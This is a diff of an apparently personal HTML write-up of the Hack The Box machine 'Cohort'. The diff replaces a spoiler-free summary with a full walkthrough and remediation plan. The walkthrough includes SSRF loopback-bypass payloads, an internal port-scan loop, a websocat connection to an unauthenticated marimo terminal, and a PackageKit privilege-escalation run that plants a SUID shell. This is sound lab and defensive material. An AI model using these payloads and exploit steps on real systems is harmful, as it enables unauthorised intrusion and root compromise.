@@ -4,15 +4,11 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Cohort — HTB Writeup (Lanky)</title>
-  <meta name="description" content="Hack The Box: Cohort — Easy Linux. SSRF through a string-match blocklist into an internal marimo notebook, a pre-auth WebSocket RCE reached via a wildcard-cert dynamic host, and root through a held, partially-upgraded PackageKit package.">
-  <link rel="stylesheet" href="../assets/style.css?v=4">
+  <meta name="description" content="Hack The Box: Cohort — Easy Linux. SSRF through a string-match blocklist into an internal marimo notebook, a pre-auth WebSocket RCE (CVE-2026-39987) reached via a wildcard-cert dynamic host, and root through a held, partially-upgraded PackageKit package (CVE-2026-41651).">
+  <link rel="stylesheet" href="../assets/style.css?v=5">
   <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#128225;</text></svg>">
 </head>
 <body>
-  <div class="banner">
-    ◷ <strong>Active Season 11 box</strong> — full technical writeup publishes once the season closes. Summary and lessons below.
-  </div>
-
   <header class="nav">
     <div class="wrap">
       <a class="brand" href="../index.html">lanky<span class="accent">.pwns</span></a>
@@ -24,91 +20,310 @@
     <a class="back" href="../index.html#lab">back to writeups</a>
     <img class="wu-logo" src="../assets/logos/cohort.png" alt="Cohort logo">
     <h1 style="margin-top:16px;">Cohort</h1>
-    <div class="subtitle">Hack The Box · <a href="https://app.hackthebox.com/machines/Cohort" target="_blank" rel="noopener">app.hackthebox.com/machines/Cohort</a></div>
+    <div class="subtitle">Hack The Box · <a href="https://app.hackthebox.com/machines/Cohort" target="_blank" rel="noopener">app.hackthebox.com/machines/Cohort</a> · Season 11</div>
     <div class="machine-meta">
       <span class="pill os-linux">Linux</span>
       <span class="pill diff-easy">Easy</span>
       <span class="pill season">Season 11</span>
       <span class="pill">SSRF</span>
       <span class="pill">Pre-auth RCE</span>
+      <span class="pill">TOCTOU privesc</span>
       <span class="pill flagp">User</span>
       <span class="pill flagp">Root</span>
       <span class="pill rooted">● Completed</span>
-      <span class="pill pending">writeup after season</span>
     </div>
 
     <div class="callout">
-      <span class="tag">Summary</span>
-      An Ubuntu 24.04 box that is really a lesson in trusting the wrong boundary. A public
-      "validate this data-feed URL" form enforced its safety with a <strong>string-match blocklist</strong>
-      that only knew one spelling of localhost, so it became a server-side request forgery primitive
-      pointed at loopback. Behind it sat an internal <strong>marimo</strong> notebook with a pre-auth
-      WebSocket bug (CVE-2026-39987). Reaching that bug took one more idea; root came from a
-      <strong>PackageKit</strong> package that had been held back at a vulnerable version while its own
-      libraries were patched around it (CVE-2026-41651).
+      <span class="tag">TL;DR</span>
+      A validation form that fetches a URL for you. A blocklist that only knows one spelling of
+      "localhost". Two CVEs. That is the whole box — a public form became a
+      <strong>server-side request forgery</strong> primitive against loopback, loopback held an internal
+      <strong>marimo</strong> notebook with a pre-auth WebSocket shell (<strong>CVE-2026-39987</strong>),
+      and root was a single <strong>PackageKit</strong> package held back at a vulnerable build while its
+      own libraries were patched around it (<strong>CVE-2026-41651</strong>).
     </div>
 
-    <h2><span class="num">01</span>Why the full writeup is held back</h2>
+    <dl class="fact">
+      <dt>Target</dt><dd><b>cohort.htb</b> — "Cohort Analytics"</dd>
+      <dt>Host OS</dt><dd>Ubuntu 24.04.4 LTS · kernel 6.8.0-136</dd>
+      <dt>Foothold</dt><dd>SSRF (blocklist bypass) → <b>CVE-2026-39987</b> (marimo pre-auth RCE)</dd>
+      <dt>Privesc</dt><dd><b>CVE-2026-41651</b> — PackageKit "Pack2TheRoot" TOCTOU</dd>
+    </dl>
+
     <p>
-      Cohort is a live <strong>Season 11</strong> machine, so in line with Hack The Box's guidance on
-      active machines I am not publishing the step-by-step reproduction, the exact bypass payloads,
-      credentials or flags. The complete walkthrough, covering the enumeration, the SSRF-to-notebook
-      pivot, the transport trick that unlocked the RCE, the privilege-escalation path and a client-style
-      remediation plan, goes live here once the season closes.
+      This one looked small from the outside and stayed small — but it is a clean lesson in trusting the
+      wrong boundary twice. A public form let me forge requests into the box's own loopback, an internal
+      notebook server was carrying a pre-auth shell, and the only thing standing between me and root was a
+      single package someone had pinned back at a vulnerable version. I have written it up the way I would
+      hand it to a client: what I did, then how I would stop it happening.
     </p>
 
-    <h2><span class="num">02</span>The interesting bits (no spoilers)</h2>
-    <h3>A blocklist is not an allow-list</h3>
+    <h2><span class="num">01</span>Recon</h2>
     <p>
-      The URL validator rejected exactly two strings and nothing else. Every other way of writing the
-      same loopback address walked straight through. That turned a "safety" feature into a
-      <strong>server-side request forgery</strong> tool for mapping and reaching services bound to
-      localhost that were never meant to face the internet.
+      Cohort Analytics is a small marketing site for a fictional retention-analytics consultancy. Three
+      ports, nothing exotic:
     </p>
-    <h3>The right vulnerability behind the wrong door</h3>
+    <pre data-lang="bash"><code>nmap -sC -sV -T4 &lt;target&gt;</code></pre>
+    <table>
+      <tr><th>Port</th><th>Service</th><th>Notes</th></tr>
+      <tr><td>22</td><td>ssh</td><td>OpenSSH 9.6p1</td></tr>
+      <tr><td>80</td><td>http</td><td>nginx, 301s to 443</td></tr>
+      <tr><td>443</td><td>https</td><td>nginx · "Cohort Analytics" SPA</td></tr>
+    </table>
     <p>
-      The SSRF found an internal notebook server carrying a genuine <strong>pre-auth remote code
-      execution</strong> bug (CVE-2026-39987): one WebSocket route that forgot to check authentication
-      and handed out an interactive shell. The catch was that the only way in — a blind, single-shot
-      HTTP GET — physically could not perform the WebSocket handshake the exploit needed.
+      The TLS certificate was a wildcard for <code>*.cohort.htb</code>. I noted it and moved on — it reads
+      like a lead but it is not one directly, and it took me a while to realise it was the whole game.
     </p>
-    <h3>The certificate was the hint</h3>
+    <pre data-lang="bash"><code>echo "&lt;target&gt; cohort.htb" | sudo tee -a /etc/hosts
+curl -sk https://cohort.htb/
+curl -sk https://cohort.htb/assets/app.js -o app.js
+feroxbuster -u https://cohort.htb/ -k \
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</code></pre>
     <p>
-      The box's wildcard TLS certificate was the tell. A per-notebook <strong>dynamic hostname</strong>
-      was proxied directly to the internal service, giving a clean, full-duplex path to the vulnerable
-      route without the SSRF's limitations. The lesson: a wildcard cert plus a permissive reverse-proxy
-      vhost can quietly re-expose everything you thought you had firewalled to loopback.
-    </p>
-    <h3>A patched host with one un-patched package</h3>
-    <p>
-      Privilege escalation was a study in discipline. The kernel was deliberately hardened, with sysctl
-      and modprobe files named after specific 2026 CVEs — and every one of them checked out as patched
-      or blocked. The real hole was a single <strong>held package</strong>: PackageKit pinned at a
-      vulnerable build while its own libraries had been upgraded past it. A deterministic
-      time-of-check/time-of-use flaw in its install handling (CVE-2026-41651) installed an
-      attacker-controlled payload as root, no prompt.
+      Brute-forcing ~5,000 subdomain names just found nginx's own catch-all, which 301s anything
+      unrecognised back to the main site. The one part of the site worth lingering on was a client portal
+      at <code>/portal.html</code>, offering to "validate" a data-feed URL before onboarding it. Anything
+      that takes a URL from me and goes and fetches it is worth a hard look.
     </p>
 
-    <h2><span class="num">03</span>Takeaways</h2>
+    <h2><span class="num">02</span>The foothold — a blocklist that knew two words</h2>
+    <p>
+      The portal's <strong>Validate source</strong> button calls <code>POST /api/validate</code> with a URL
+      and a declared format. The stated safeguard was to reject anything pointing at localhost or a loopback
+      address. In practice that was a literal string comparison against <code>127.0.0.1</code> and
+      <code>localhost</code> — and a blocklist that only knows two spellings of a thing is not a blocklist
+      at all. Every alternate way of writing loopback sailed straight through:
+    </p>
+    <pre data-lang="bash"><code># the honest request, to see a normal response
+curl -sk -X POST https://cohort.htb/api/validate \
+  -H "Content-Type: application/json" \
+  -d '{"url":"https://example.com/","format":"csv"}'
+
+# what the blocklist actually catches
+curl -sk -X POST https://cohort.htb/api/validate -d '{"url":"http://127.0.0.1/"}'   # blocked
+curl -sk -X POST https://cohort.htb/api/validate -d '{"url":"http://localhost/"}'   # blocked
+
+# everything it does not
+curl -sk -X POST https://cohort.htb/api/validate -d '{"url":"http://127.1/"}'              # short form
+curl -sk -X POST https://cohort.htb/api/validate -d '{"url":"http://0177.0.0.1/"}'         # octal
+curl -sk -X POST https://cohort.htb/api/validate -d '{"url":"http://2130706433/"}'         # decimal
+curl -sk -X POST https://cohort.htb/api/validate -d '{"url":"http://[::ffff:127.0.0.1]/"}' # v4-mapped v6</code></pre>
+    <p>
+      Root cause: the backend checked the hostname against a fixed <code>BLOCKED_HOSTS</code> list with no
+      DNS resolution and no normalisation, so any encoding it did not literally list was treated as
+      "external" and fetched. There is no outbound internet from the box, so this SSRF was only ever going
+      to matter against internal services — which is exactly what it was for.
+    </p>
+
+    <h2><span class="num">03</span>Pivoting inward</h2>
+    <p>
+      With a working bypass, the validator became a blind port scanner against loopback. I swept the low
+      ports and watched for the difference between "connection refused" and an actual response:
+    </p>
+    <pre data-lang="bash"><code>for p in $(seq 1 10000); do
+  curl -sk --max-time 3 -X POST https://cohort.htb/api/validate \
+    -d "{\"url\":\"http://127.1:$p/\"}" | grep -q 'Connection refused' || echo "OPEN: $p"
+done</code></pre>
+    <p>Two things answered:</p>
     <ul>
-      <li><strong>Validate egress with an allow-list, after DNS resolution.</strong> Blocklisting string forms of "localhost" is not SSRF defence; resolve the host, reject internal ranges, and re-check post-resolution to beat rebinding.</li>
-      <li><strong>Loopback is not a security boundary.</strong> A wildcard certificate and a catch-all proxy vhost re-exposed an internal service that binding to 127.0.0.1 was supposed to protect.</li>
-      <li><strong>Patch the version, not just the transport.</strong> The notebook RCE was fixed upstream; running an old build behind a proxy still shipped the bug.</li>
-      <li><strong>Never hold a package below its own libraries.</strong> The whole root path existed because one security-relevant package was pinned while everything around it was updated.</li>
-      <li>Straight into the day job: detection for SSRF to internal ranges, unauthenticated WebSocket shells, and partial-upgrade package states, plus an Ubuntu 24.04 STIG / CIS hardening baseline.</li>
+      <li><code>5000</code> → cohort-insights, the same backend I was already talking to. Nothing new.</li>
+      <li><code>8888</code> → a <strong>marimo</strong> reactive-notebook server, sitting behind a password gate.</li>
+    </ul>
+    <p>
+      marimo is a Python notebook, and notebook servers are a gift if you can reach them. I fingerprinted
+      the version through the same SSRF:
+    </p>
+    <pre data-lang="bash"><code>curl -sk -X POST https://cohort.htb/api/validate \
+  -d '{"url":"http://127.1:8888/api/version"}'
+# → marimo 0.20.4</code></pre>
+
+    <h2><span class="num">04</span>The right CVE, the wrong transport</h2>
+    <p>
+      That version is vulnerable to <strong>CVE-2026-39987</strong>. marimo before 0.23.0 forgets to
+      authenticate one WebSocket route: <code>/terminal/ws</code> never calls the auth check that every
+      other WS route does. It only checks the running mode and platform support, then hands out a live PTY
+      — no token, no password. On a box running 0.20.4 that is a straight pre-auth RCE.
+    </p>
+    <p>
+      The catch, and the actual thinking on this box: my only path to <code>127.0.0.1:8888</code> was the
+      SSRF, and the SSRF was a blind, single-shot HTTP <code>GET</code>. I had no control over the method
+      or the headers, which makes it structurally incapable of the <code>Upgrade: websocket</code>
+      handshake the exploit needs. I had the right vulnerability behind the wrong door.
+    </p>
+
+    <h2><span class="num">05</span>The unlock — the wildcard cert mattered after all</h2>
+    <p>
+      marimo was not only bound to loopback — it was also reachable over a per-notebook <strong>dynamic
+      hostname</strong> that nginx proxies straight through to <code>127.0.0.1:8888</code>. That path is a
+      normal front-door HTTPS vhost, so it happily carries a full WebSocket upgrade, sidestepping the
+      SSRF's transport limits entirely. The <code>*.cohort.htb</code> certificate is what makes those
+      <code>nb-&lt;id&gt;</code> hosts resolvable and trusted. Once I had the notebook id from the SSRF
+      fingerprint, I pointed straight at it:
+    </p>
+    <pre data-lang="bash"><code>echo "&lt;target&gt; nb-&lt;notebook-id&gt;.cohort.htb" | sudo tee -a /etc/hosts
+websocat -k wss://nb-&lt;notebook-id&gt;.cohort.htb/terminal/ws
+$ id
+uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
+$ cat /home/marimo/user.txt</code></pre>
+    <div class="flag"><span class="label">user.txt</span>&lt;redacted&gt;</div>
+
+    <h2><span class="num">06</span>Privesc — everything that did not work</h2>
+    <p>
+      As <code>marimo</code> I ran the usual sweep — SUID/SGID, sudo, cron and timers, capabilities,
+      polkit — and it all came up empty:
+    </p>
+    <pre data-lang="bash"><code>sudo -V; dpkg -l sudo needrestart
+uname -v; dpkg -l 'linux-image*'
+cat /etc/modprobe.d/*.conf
+find / -perm -4000 -type f 2>/dev/null   # SUID
+find / -perm -2000 -type f 2>/dev/null   # SGID</code></pre>
+    <p>
+      The kernel was deliberately hardened, with <code>sysctl</code> and <code>modprobe</code> files named
+      after specific 2026 kernel CVEs — a trap laid to burn time. I checked each one against the exact
+      build (6.8.0-136.136) instead of assuming, and every single one was already dead:
+    </p>
+    <table>
+      <tr><th>Name</th><th>CVE</th><th>Status</th></tr>
+      <tr><td>GhostLock</td><td>2026-43499</td><td><span class="ok">Patched</span> — kernel at fixed build</td></tr>
+      <tr><td>Fragnesia</td><td>2026-46300</td><td><span class="ok">Patched</span> upstream</td></tr>
+      <tr><td>DirtyClone</td><td>2026-43503</td><td><span class="ok">Patched</span> upstream</td></tr>
+      <tr><td>Copy Fail</td><td>2026-31431</td><td><span class="no">Blocked</span> — algif_aead disabled</td></tr>
+      <tr><td>Dirty Frag</td><td>2026-43284 / 43500</td><td><span class="no">Blocked</span> — esp4/esp6/rxrpc off</td></tr>
+      <tr><td>pedit COW</td><td>2026-46331</td><td><span class="no">Blocked</span> — needs CAP_NET_ADMIN; userns off</td></tr>
+      <tr><td>AF_UNIX OOB UAF</td><td>2025-38236</td><td><span class="ok">Patched</span> upstream</td></tr>
+    </table>
+    <p>
+      Seven for seven. The kernel path was never it — the point of that section was to make you waste an
+      afternoon on it. I would rather rule a thing out in five minutes with a version check than run an
+      exploit blind, so I moved on.
+    </p>
+
+    <h2><span class="num">07</span>Root — a held package</h2>
+    <p>
+      linpeas caught what the manual sweep did not: PackageKit was pinned at a vulnerable build while its
+      own supporting library had been upgraded around it.
+    </p>
+    <pre data-lang="bash"><code>bash linpeas.sh > lp.out 2>&amp;1
+dpkg -l | grep packagekit
+hi  packagekit               1.2.8-2ubuntu1.2   # held, vulnerable
+ii  libpackagekit-glib2-18   1.2.8-2ubuntu1.5   # patched</code></pre>
+    <p>
+      That <code>hi</code> state — held, half-upgraded — is the whole bug's enabler.
+      <strong>CVE-2026-41651</strong>, "Pack2TheRoot", is a <em>deterministic</em> (not racy) TOCTOU in
+      PackageKit's <code>InstallFiles</code> handling. Two <code>InstallFiles()</code> calls in quick
+      succession — first with <code>SIMULATE</code>, which skips the polkit prompt, then with the real
+      flags — let the second call overwrite the cached transaction state before GLib's idle callback runs
+      it. The daemon then installs whatever the second call pointed at, as root, with no authentication
+      prompt. Because it is deterministic there is no race to win — it just works.
+    </p>
+    <pre data-lang="bash"><code>python3 pack2root.py --check
+python3 pack2root.py --no-cleanup --exec 'id; cat /root/root.txt'
+[+] SUCCESS: SUID bash at /tmp/.suid_bash
+uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)</code></pre>
+    <div class="flag"><span class="label">root.txt</span>&lt;redacted&gt;</div>
+
+    <h2><span class="num">08</span>If this were your environment</h2>
+    <p>
+      This is the part I care about most, because it is the part that maps to my day job. Every finding
+      below has the fix I would write into a report, plus the hardening controls it lands under so you are
+      not taking my word for it.
+    </p>
+
+    <div class="finding">
+      <span class="tag">Finding 1 · High</span>
+      <h4>SSRF — URL validation built on a string-match blocklist (CWE-918)</h4>
+      <p>
+        The validator decided "safe" by comparing the hostname string against two blocked values. Any other
+        encoding of loopback — short, octal, decimal, IPv4-mapped IPv6 — was treated as external and
+        fetched, turning a safety feature into a request-forgery primitive against internal services.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Stop blocklisting; allow-list instead.</strong> Maintain the set of vetted feed providers and reject everything else. A blocklist of "bad" spellings will always miss one.</li>
+        <li><strong>Resolve, then validate, then re-check.</strong> Resolve the hostname to an IP, reject anything in loopback / link-local / RFC1918 / CGNAT / v4-mapped-v6 ranges, and re-check <em>after</em> resolution to defeat DNS rebinding. Pin the resolved IP for the fetch itself.</li>
+        <li><strong>Cage the fetcher.</strong> Run the validator in an egress-restricted segment with default-deny; only the declared feed CDNs are reachable. Then even a bypass reaches nothing.</li>
+        <li><strong>Harden the client:</strong> disable redirects (or re-validate every hop), block non-http(s) schemes, and cap response size and time.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> SC-7 and SC-7(11)/(21) boundary protection &amp; egress isolation · AC-4 information-flow enforcement · SI-10 input validation<br>
+        <b>NIST 800-171 r3:</b> 3.13.1 / 3.13.5 boundary protection · 3.14.x input validation<br>
+        <b>CIS Controls v8:</b> 4.x secure configuration · 13.x network monitoring &amp; egress control<br>
+        <b>Vendor / OWASP:</b> SSRF Prevention Cheat Sheet — allow-list, block internal ranges, disable unused schemes
+      </div>
+    </div>
+
+    <div class="finding">
+      <span class="tag">Finding 2 · Critical</span>
+      <h4>Internal marimo exposed with an unauthenticated PTY (CVE-2026-39987)</h4>
+      <p>
+        marimo 0.20.4 served a pre-auth interactive shell on <code>/terminal/ws</code>, and a permissive
+        wildcard-cert vhost re-exposed the loopback-bound service to the network. Binding to 127.0.0.1 was
+        undone by the reverse proxy.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Patch to the fixed version:</strong> marimo <code>&gt;= 0.23.0</code>, which restores the auth check on the terminal route.</li>
+        <li><strong>Turn the terminal off in server deployments</strong> and never run marimo with <code>--no-token</code> anywhere edge-reachable. Require a token, and put proper authentication at the proxy in front of it.</li>
+        <li><strong>Do not let the proxy re-expose loopback.</strong> Scope the wildcard vhost tightly; require authentication for anything that forwards to <code>127.0.0.1:8888</code>. Loopback is not a security boundary once a catch-all vhost sits in front of it.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> SI-2 flaw remediation · CM-7 least functionality (disable terminal) · IA-2 / IA-5 authentication · AC-3 access enforcement · SC-7 proxy boundary<br>
+        <b>NIST 800-171 r3:</b> 3.4.6 least functionality · 3.5.x identification &amp; auth · 3.14.1 flaw remediation<br>
+        <span class="stig"><b>DISA STIG (call-out):</b></span> Application Security &amp; Development STIG APSC-DV-002540 / -002550 — authenticate all access, no unauthenticated interactive function. This "no unauthenticated management/shell interface" requirement is <em>explicit</em> in the DISA App Sec &amp; Dev STIG but is <em>not</em> spelled out the same way in CIS or NIST — cite the STIG when writing this up for government work.<br>
+        <b>CIS Controls v8:</b> 4.8 disable unnecessary services · 7.x continuous vulnerability management
+      </div>
+    </div>
+
+    <div class="finding">
+      <span class="tag">Finding 3 · Critical</span>
+      <h4>Root via a held, partially-upgraded PackageKit (CVE-2026-41651)</h4>
+      <p>
+        The whole root path existed because <code>packagekit</code> was pinned at
+        <code>1.2.8-2ubuntu1.2</code> while <code>libpackagekit-glib2-18</code> had moved to the patched
+        <code>1.2.8-2ubuntu1.5</code>. A held daemon sitting below its own libraries is the exact condition
+        the TOCTOU needs.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Un-hold and patch:</strong> <code>apt-mark unhold packagekit</code>, then update <code>packagekit</code> to <code>&gt;= 1.2.8-2ubuntu1.5</code> so the daemon matches its library.</li>
+        <li><strong>Never hold a security-relevant package below its own libraries.</strong> If a pin is unavoidable, pin the whole set together, and alert on any partial-upgrade state.</li>
+        <li><strong>Lock down who can call it:</strong> use polkit rules to deny unprivileged local users the <code>org.freedesktop.packagekit.*</code> actions that do not require auth by default.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> SI-2 flaw remediation · CM-2 / CM-6 baseline &amp; config settings (no held packages) · CM-7 least functionality · AC-6 least privilege (polkit)<br>
+        <b>NIST 800-171 r3:</b> 3.4.1 / 3.4.2 baseline config · 3.14.1 flaw remediation · 3.1.5 least privilege<br>
+        <span class="stig"><b>DISA STIG:</b></span> Ubuntu 24.04 LTS STIG (UBTU-24-*) — security updates applied, no packages held back from security patching; enforceable via Canonical's Ubuntu Security Guide (USG)<br>
+        <b>CIS:</b> CIS Ubuntu Linux 24.04 Benchmark 1.9 "updates, patches &amp; additional security software installed"<br>
+        <b>Vendor:</b> Canonical USN for CVE-2026-41651 — upgrade to the fixed <code>1.2.8-2ubuntu1.5</code>; do not pin or hold. The freedesktop PackageKit advisory patches the InstallFiles transaction-state handling.
+      </div>
+    </div>
+
+    <h2><span class="num">09</span>Detection — the blue-team side</h2>
+    <p>What I would want alerting on if I could not fix it tomorrow:</p>
+    <ul>
+      <li><strong>SSRF:</strong> alert when the validator process opens connections to loopback / RFC1918 ranges, and log the declared host against the resolved host on every request.</li>
+      <li><strong>marimo:</strong> alert on any <code>/terminal/ws</code> connection, on marimo spawning <code>/bin/bash</code> or a PTY, and on outbound activity from the marimo uid.</li>
+      <li><strong>PackageKit:</strong> alert on two <code>InstallFiles</code> D-Bus calls within a short window from a non-admin uid, on new SUID files appearing in <code>/tmp</code>, and on <code>packagekitd</code> installing local files outside the normal apt flow.</li>
     </ul>
 
-    <div class="callout todo">
-      <span class="tag">Coming after Season 11</span>
-      Full technical walkthrough with the enumeration, the blocklist-bypass SSRF, the loopback port
-      map, the dynamic-host transport unlock into the pre-auth RCE, the PackageKit TOCTOU privilege
-      escalation, and a prioritised remediation and hardening plan mapped to NIST 800-53/171, the
-      DISA Ubuntu 24.04 STIG and the CIS Benchmark.
-    </div>
+    <h2><span class="num">10</span>Takeaways</h2>
+    <ul>
+      <li><strong>A blocklist is not an allow-list.</strong> If your SSRF defence is a list of "bad" hostnames, you have already lost — validate after DNS resolution against a list of things you trust.</li>
+      <li><strong>Loopback is not a boundary.</strong> A wildcard cert and a catch-all proxy vhost quietly re-exposed a service that binding to 127.0.0.1 was meant to protect.</li>
+      <li><strong>Match the exploit to the transport you actually have.</strong> The RCE was real from the first fingerprint; the work was realising a blind GET could not carry it, and finding the path that could.</li>
+      <li><strong>Rule kernel CVEs out with version checks, not exploits.</strong> Seven named traps, all dead — five minutes of <code>dpkg</code> and <code>sysctl</code> beat an afternoon of running PoCs.</li>
+      <li><strong>Never hold a package below its own libraries.</strong> The entire root path was one pinned daemon. Patch state <em>is</em> attack surface.</li>
+    </ul>
 
     <p style="margin-top:40px;"><a class="back" href="../index.html#lab">back to writeups</a></p>
   </article>
 
-  <footer><div class="wrap">Cohort · completed · Lanky &nbsp;·&nbsp; <a href="../index.html#lab">all writeups</a></div></footer>
+  <footer><div class="wrap">Cohort · Season 11 · completed · Lanky &nbsp;·&nbsp; <a href="../index.html#lab">all writeups</a></div></footer>
 </body>
 </html>
